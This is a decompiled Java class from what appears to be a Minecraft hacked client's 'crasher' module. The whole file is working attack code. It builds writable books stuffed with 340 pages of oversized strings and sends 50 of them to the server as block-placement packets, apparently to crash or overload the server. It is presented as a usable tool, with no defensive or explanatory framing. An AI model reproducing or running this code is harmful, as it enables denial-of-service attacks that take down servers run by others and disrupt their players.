// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.netty;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.util.math.BlockPos;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import java.util.Random;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class NettyCrasher1
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                for (int i2 = 0; i2 < 50; ++i2) {
                    final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
                    final String author = "Netty" + new Random().nextInt(50);
                    final String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
                    final NBTTagCompound tag = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();
                    for (int i3 = 0; i3 < 340; ++i3) {
                        final String siteContent = size;
                        final NBTTagString tString = new NBTTagString(siteContent);
                        list.appendTag(tString);
                    }
                    tag.setString("author", author);
                    tag.setString("title", "");
                    tag.setTag("pages", list);
                    if (book.hasTagCompound()) {
                        final NBTTagCompound tagb = book.getTagCompound();
                        tagb.setTag("pages", list);
                    }
                    else {
                        book.setTagInfo("pages", list);
                    }
                    Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().player.posX, Minecraft.getMinecraft().player.posY - 2.0, Minecraft.getMinecraft().player.posZ), 1, book, 0.0f, 0.0f, 0.0f));
                }
            }
        }.start();
    }
}
